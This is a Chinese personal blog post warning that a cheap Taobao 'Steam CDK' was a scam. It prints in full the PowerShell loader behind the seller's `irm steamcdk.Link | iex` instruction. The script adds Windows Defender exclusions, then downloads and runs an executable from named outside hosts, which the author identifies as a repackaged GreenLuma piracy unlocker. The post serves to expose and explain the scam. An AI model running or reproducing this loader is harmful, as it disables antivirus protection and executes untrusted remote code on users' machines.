---
layout: post
tags: ["steam","信息安全", "游戏", "greenluma"]
title: "廉价steam cdk其实在卖盗版甚至还坑到我了这件事！"
date: 2024-03-09T15:40:05+08:00
math: false
draft: false
toc: true
---

今天突然看到 steam 上的游戏 "House Flipper 2" -20%，虽说减完之后还剩 ￥108，但是毕竟，办法总比困难多，去淘宝看看有没有廉价 cdk 吧！结果，这导致我被店家的伎俩欺骗！

<!--more-->

<!-- toc -->

## 廉价 cdk

众所周知，有事就找万能的淘宝，打开淘宝，搜索 "House Flipper 2"，发现最便宜的 cdk 居然只要 ￥9.9，看起来狠虚假的价格，毕竟史低都是 ￥108。

但是，￥9.9，还要什么自行车？直接下单。

随后，店家发了一份使用说明：

> 首先打开终端，输入 `irm steamcdk.Link | iex`
>
> 随后会弹出输入 cdk 的窗口，在里面输入 cdk 即可激活
>
> cdk：AAAAA-BBBBB-CCCCC-DDDDD-EEEEE

乍一看倒是蛮正常的，仿佛是打开了什么 steamcdk 的功能。

特别提一下，**这里我直接在 steam 窗口内兑换，会提示无效兑换码**，但是当时鬼使神差觉得可能是因为需要用这个特殊的方法打开兑换窗口才行。

（说不定这就是人性的贪婪和懒惰，以后注意，不过花开两朵，各表一枝，我们先继续说被骗的事）

那按照前面所述，不得已，开个终端执行这个命令，然后弹出一个警告弹窗，"you are using steam beta files, greenluma ..."，啊不过当然最后不是省略号，可是忘了后面是什么内容了。

随后 steam 被启动，库里已经有了这个游戏。

## 发现问题

看起来很正常啊，合情合理，但是我之前把这个游戏加了购物车，现在还在购物车里。如果我是小白或许我就信了，但是很遗憾，我以前激活的游戏会从购物车中离开。

其次，在商店页面，仍然能够为自己购买这个游戏。

这时候我怀疑是家庭共享，并且找店家要求退款，表示这是共享的用不了。

店家虽然表示这不是共享，但是还是给退了。

但是！这个游戏，还在库里。

这不合常理，它为什么会在库里？

如果它真的有成本，店家为什么这么容易退款？

## 试图揭秘

### 那行命令是什么？

好，很巧，我以前曾经用过 `irm` 这个命令，虽然不那么熟悉，但是我用浏览器打开了 `steamcdk.link`，结果自动跳转到了 `http://steamcdk.link/sendfile`，并且其中有很多伪装的输出来假扮正版 `steam`，去掉这部分输出，剩余脚本如下：

```ps1
# [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
#Requires -RunAsAdministrator

$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
if (-not $isAdmin) {
    Write-Host "Please Run as Administrator"
}

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = (Get-ItemProperty -Path $steamRegPath -Name 'SteamPath').SteamPath
$root = $steamPath.Substring(0,1) # 鑾峰彇璺緞涓殑鐩樼閮ㄥ垎
$rest = $steamPath.Substring(1)   # 鑾峰彇璺緞涓洏绗﹀悗闈㈢殑閮ㄥ垎
$steamPath = $root.ToUpper() + $rest # 灏嗙洏绗﹂儴鍒嗚浆鎹负澶у啓

# $steamPath = $filePath -replace "/", "\"

# Write-Host $steamPath

if ($null -ne $steamPath) {
    try {
# exclude windows defender
        if (Get-Service | where-object { $_.name -eq "windefend" -and $_.status -eq "running" }) {
            Add-MpPreference -ExclusionPath $steamPath -ExclusionExtension ".dll",".exe"
            Write-Host "  [STEAM]  Windows Defender has been exclude"
        }
        else {
            Write-Host "  [STEAM] Windows Defender exclude failed."
        }

# display Message
        Write-Host "  [STEAM] App is ready for run .please wait... "
        Write-Host "  [STEAM] Windows Defender has been clear "
        Write-Host "  [STEAM] Ready to go !!! "
        Write-Host "  [STEAM] watiing 1-3min "

# download file and process
        $appStorePath = Join-Path $steamPath "steamworks.exe"
        $downloadUrl = "http://by.haory.cn/1/1128/steamworks.exe"
        $backupUrl = "https://m1744435.096096.xyz/steamworks.exe"

        try {
            (New-Object Net.WebClient).DownloadFile($downloadUrl, $appStorePath)
        } catch {
            Write-Warning "Steamcdk failed. [STEAM] watiing."
            try {
                (New-Object Net.WebClient).DownloadFile($backupUrl, $appStorePath)
            } catch {
                Write-Error "Steamcdk failed. Please check your internet connection or colse 鍏抽棴VPN閲嶈瘯."
            }
        }

# lauch execute our exe file;
        Start-Process -FilePath $appStorePath
    }
    catch {

    }
}
```

很简单的一段 `powershell` 脚本，首先获取管理员权限，随后获取 `Steam` 的安装路径记为 `$SteamPath`。

插段题外话，这里一个好笑的点是，这里有很多中文乱码是吧，这些乱码原来是 `gbk` 格式，但是被保存为了 `utf8`，所以变成了乱码，这四行乱码分别是

```ps1
$root = $steamPath.Substring(0,1) # 获取路径中的盘符部分
$rest = $steamPath.Substring(1)   # 获取路径中盘符后面的部分
$steamPath = $root.ToUpper() + $rest # 将盘符部分转换为大写

Write-Error "Steamcdk failed. Please check your internet connection or colse 关闭VPN重试."
```

*中文乱码恢复功能 powered by [WR便利工具网](https://wrtools.top/coderepair.php)*

在获取 `$SteamPath` 之后，为了防止被敏感拉满的 `Windows Defender` 干掉，它先把 `$SteamPath` 加入了 `Windows Defender` 的排除路径（白名单）。

随后，它尝试去 `http://by.haory.cn/1/1128/steamworks.exe` 下载这个 exe 文件，并放入 `$SteamPath` 中。如果这个网址不可用，则使用备份网址 `https://m1744435.096096.xyz/steamworks.exe` 来下载。不得不说，聪明的备份机制。

最后，执行下载得到的 `steamworks.exe` 文件，它会劫持并接管 steam 的启动。

### 之前有人遇到过吗？

有，而且有各种技法 ，列举三个常见的出来：

1. [家庭账号共享](https://zhuanlan.zhihu.com/p/619338811)
2. [steamip 助手（第三方软件）](https://tieba.baidu.com/p/8216526284)
3. [steamworks （就是我遇到这个）](https://www.bilibili.com/video/BV15u411x7Se/)

### 这个有多大危害呢？

好吧，其实危害并不大，记得前面那个警告窗口吗？`XXX greenluma XXX` 那个，这里面突兀出现的词 `GreenLuma` 其实就是破局点。

GreenLuma 是一款国外大神 Steam006 开发的游戏解锁工具（正版途径玩盗版），其实爱好者有很多都在使用这个工具，可以参考 [知乎介绍](https://zhuanlan.zhihu.com/p/638294581) 、[贴吧讲解](https://tieba.baidu.com/p/7951081224) 或者直接去 [Github 下载](https://github.com/BlueAmulet/GreenLuma-2024-Manager/releases)。

但是！这个店家重新打包成 `steamworks` 之后，由于不透明的原因，其中的危害是不可预知的，因此建议不要保留，通过彻底卸载并删除 steam 即可清除。

当然，因为我开了火绒的联网控制，可以看到这个 `steamworks`全程是没有主动联网的，所以应该不用担心账号密码被泄露的问题。

### 怎么清除

先卸载 steam，随后删除 steam 所在的文件夹，最后重新安装即可。

## 尝试总结

总之，贪小便宜吃大亏，好在退掉了，但愿以后不要再中这种漏洞百出的骗局。
